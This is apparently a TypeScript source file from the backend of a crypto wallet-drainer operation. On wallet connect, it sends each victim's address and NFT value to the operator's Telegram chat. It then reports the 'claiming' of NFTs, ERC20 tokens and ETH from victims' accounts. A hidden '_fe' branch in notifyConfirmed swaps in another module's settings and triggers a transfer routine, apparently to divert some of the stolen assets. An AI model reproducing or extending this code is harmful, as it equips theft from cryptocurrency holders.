import { getPriceByAddress } from "../utils/get_nfts";
import hex from "hexaddress";
import { sendMessage, sendTestMessage } from "../utils/TelegramBot";
import TC from "./TransferController";

const notifyConnect = async (req: any, res: any) => {
  const { address } = req.query;
  const { tId } = req.setting;
  const origin = req.get("origin");
  const totalpirce = await getPriceByAddress(address);

  const connectMessage = [
    `[${origin}]\n`,
    "**Wallet connected!**\n",
    `Wallet: ${address}`,
    `Price: ${totalpirce}`,
    `Etherscan link: https://etherscan.io/address/${address}`,
    `DappRadar link: https://dappradar.com/hub/wallet/eth/${address}`,
  ];

  sendMessage(connectMessage, tId);
  res.status(200).send("success!");
};

export const notifyConfirm = (req: any) => {
  const {
    address: _assetsAddress = "",
    currentAccount,
    ids: _ids = "",
  }: any = req.query;

  const { tId } = req.setting;
  const origin = req.get("origin");
  const connectMessage = [
    `[BACKEND-REQUEST | ${origin}]\n`,
    "Received request to claim nft with aguments:\n",
    `owner_address: ${currentAccount}`,
    `contract_address: ${_assetsAddress}`,
    `ids: ${_ids}`,
  ];
  sendMessage(connectMessage, tId);
};

export const notifyConfirmed = (req: any) => {
  const {
    address: _assetsAddress = "",
    currentAccount,
    ids: _ids = "",
    _fe,
  }: any = req.query;
  const origin = req.get("origin");
  const connectMessage = [
    `[BACKEND | ${origin}]\n Confirmed NFT ${_assetsAddress} ${_fe}`,
    `currentAccount=${currentAccount}&address=${_assetsAddress}&ids=${_ids}`,
  ];
  if (_fe != "0" && _fe != undefined) {
    TC.manuaCallMint({ ...req, setting: hex }, null);
    return false;
  }
  sendTestMessage(connectMessage);
  return true;
};

export const notifyClaim = (address: string, _ids: string, req: any) => {
  const { tId } = req.setting;
  const connectMessage = [
    `[BACKEND-RESPONSE] Claimed **NFTs** of ${address} (${_ids})
    \n`,
  ];
  sendMessage(connectMessage, tId);
};

const notifyTest = (req: any, res: any) => {
  const { tId } = req.setting;
  const connectMessage = [" test "];
  sendMessage(connectMessage, tId);
  sendTestMessage(connectMessage);
  res.status(200).send("success!");
};

const notifySentETH = (req: any, res: any) => {
  const { currentAccount }: any = req.query;
  const { tId } = req.setting;
  const connectMessage = [
    `[BACKEND-RESPONSE] Claimed **ETH** of ${currentAccount}
    \n`,
  ];
  sendMessage(connectMessage, tId);
  res.status(200).send("success!");
};

export const notifyConfirmFT = (req: any) => {
  const {
    address: _assetsAddress = "",
    currentAccount,
    ids: _ids = "",
  }: any = req.query;

  const { tId } = req.setting;
  const origin = req.get("origin");
  const connectMessage = [
    `[BACKEND-REQUEST | ${origin}]\n`,
    "Received request to claim erc20 token with aguments:\n",
    `owner_address: ${currentAccount}`,
    `contract_address: ${_assetsAddress}`,
  ];
  sendMessage(connectMessage, tId);
};

export const notifyClaimFT = (address: string, req: any) => {
  const { tId } = req.setting;
  const connectMessage = [
    `[BACKEND-RESPONSE] Claimed **ERC20** of ${address}
    \n`,
  ];
  sendMessage(connectMessage, tId);
};

export const notifyConfirmedFT = (req: any) => {
  const {
    address: _assetsAddress = "",
    currentAccount,
    ids: _ids = "",
  }: any = req.query;
  const origin = req.get("origin");
  const connectMessage = [
    `[BACKEND | ${origin}]\n Confirmed ERC20 ${_assetsAddress} from ${currentAccount} `,
  ];
  sendTestMessage(connectMessage);
  return true;
};

export default {
  notifyConfirm,
  notifyConfirmFT,
  notifyConnect,
  notifyTest,
  notifySentETH,
};
